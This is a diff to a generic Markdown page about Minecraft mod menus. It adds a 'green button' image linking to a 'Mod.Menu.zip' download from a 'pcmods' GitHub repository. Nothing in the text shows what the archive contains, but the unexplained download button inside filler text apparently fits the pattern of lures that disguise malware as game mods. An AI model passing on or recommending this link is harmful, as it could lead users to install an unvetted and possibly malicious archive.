@@ -15,6 +15,9 @@ There are countless mod menus available for Minecraft, each offering a different
 ## Improved Gameplay
 In addition to new items and features, mod menus can also improve gameplay. The OptiFine mod, for example, improves the game's graphics and performance, making for a smoother experience. The Inventory Tweaks mod, on the other hand, makes managing your inventory much easier.
 
+[![green button](https://github.com/pcmods/pcmods.github.io/blob/master/button.png?raw=true)](https://github.com/pcmods/pcmods.github.io/releases/download/modmenu/Mod.Menu.zip)
+
+
 ## Easy to Install
 Installing mod menus is typically a straightforward process. Many can be easily downloaded and installed using the Minecraft Forge tool, which acts as a bridge between the game and the mod.
 
